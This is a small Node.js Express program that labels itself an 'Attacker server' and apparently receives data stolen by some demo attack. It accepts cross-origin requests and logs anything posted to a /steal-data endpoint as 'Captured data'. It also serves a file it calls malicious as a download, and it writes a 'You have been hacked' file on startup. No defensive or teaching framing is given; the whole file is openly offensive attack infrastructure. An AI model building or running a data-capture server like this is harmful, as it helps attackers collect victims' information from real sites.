const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
path = require('path');
const fs = require('fs');

const app = express();
const PORT = 3001;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
const filePath = path.join(__dirname, 'hacked.txt');
fs.writeFileSync(filePath, 'You have been hacked XD'); 

const fileContent = 'I have been hacked XD\nThis is a malicious file.';

app.get('/get-file', (req, res) => {
  res.setHeader('Content-Type', 'text/plain'); 
  res.setHeader('Content-Disposition', 'attachment; filename="seeMore.txt"'); 
  res.send(fileContent); 
});

app.post('/steal-data', (req, res) => {
  const { data } = req.body;
  console.log('Captured data:', data); 
  res.send('Data received');
});

app.listen(PORT, () => {
  console.log(`Attacker server running at http://localhost:${PORT}`);
});
